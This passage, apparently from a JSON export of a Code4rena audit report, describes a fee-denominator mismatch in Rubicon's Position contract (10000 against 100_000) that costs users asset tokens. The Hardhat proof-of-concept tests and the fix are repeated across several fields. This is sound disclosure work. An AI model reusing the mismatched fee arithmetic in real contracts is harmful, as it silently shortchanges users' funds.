`test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624437 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);\n      });\n```\n\nSecond, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nThird, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5624943 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);\n\n        // owner receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000\n        expect(5624943).to.be.gt(5624437);\n      });\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.",
      "description": null,
      "impact": "## Impact\nCalling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n        ...\n    }\n```\n\nBecause the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that she or he is entitled to.\n",
      "mitigation": "## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.\n",
      "poc": "## Proof of Concept\nFirst, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624437 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);\n      });\n```\n\nSecond, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nThird, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5624943 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);\n\n        // owner receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000\n        expect(5624943).to.be.gt(5624437);\n      });\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nCalling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n        ...\n    }\n```\n\nBecause the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that she or he is entitled to.\n",
        "recommendation": "## Recommended Mitigation Steps\nThe `Position._marketBuy` and `Position._marketSell` functions can be updated to divide by `100_000`, instead of `10000`, when calculating `_fee`.\n",
        "poc": "## Proof of Concept\nFirst, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624437 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);\n      });\n```\n\nSecond, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nThird, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5624943 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);\n\n        // owner receives more asset tokens in this situation than when Position._marketBuy function calculates _fee through dividing by 10000\n        expect(5624943).to.be.gt(5624437);\n      });\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketBuy` function executes `uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000)`, and calling the `Position._marketSell` function below executes `uint256 _fee = _minFill.mul(_feeBPS).div(10000)` and `_fee = _payAmount.mul(_feeBPS).div(10000)`; in these `_fee` calculations, `10000` is used as the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen calling the `Position._marketBuy` and `Position._marketSell` functions, the following `RubiconMarket.buy` function will be eventually called. Calling the `RubiconMarket.buy` function executes `uint256 fee = mul(spend, feeBPS) / 100_000`, where `100_000`, which is not `10000`, is the denominator.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n        ...\n    }\n```\n\nBecause the `Position._marketBuy` and `Position._marketSell` functions calculate `_fee` through dividing by `10000` but the `RubiconMarket.buy` function calculates `fee` through dividing by `100_000`, `_fee` and `fee` are different. This can cause incorrect calculations when calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function, and users can lose tokens that they are entitled to as a result. For example, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`. Thus, since the `Position._marketBuy` function currently calculates `_fee` through dividing by `10000`, the user loses some asset tokens that she or he is entitled to.\n\n## Proof of Concept\nFirst, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 10000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // owner receives 5624437 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624437);\n      });\n```\n\nSecond, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nThird, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000`. This test also demonstrates that the user should receive more asset tokens when the `Position._marketBuy` function calculates `_fee` through dividing by `100_000` than when the `Position._marketBuy` function calculates `_fee` through dividing by `10000`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000\", async function () {\n        const { owner, testCoin, testStableCoin, Position} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // owner calls Position.buyAllAmountWithLeverage function\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        // owner still sends 25000000000000000000 quote tokens\n        const ownerTestCoinBalanceAfter = await testCoin.balanceOf(owner.address);\n        expect(ownerTestCoinBalanceAfter.sub(ownerTestCoinBalanceBefore)).to.equal(-25000000000000000000n);\n\n        // yet, owner receives 5624943 asset tokens\n        const ownerTestStableCoinAfter = await testStableCoin.balanceOf(owner.address);\n        expect(ownerTestStableCoinAfter.sub(ownerTestStableCoinBefore)).to.equal(5624943);\n\n        // owner 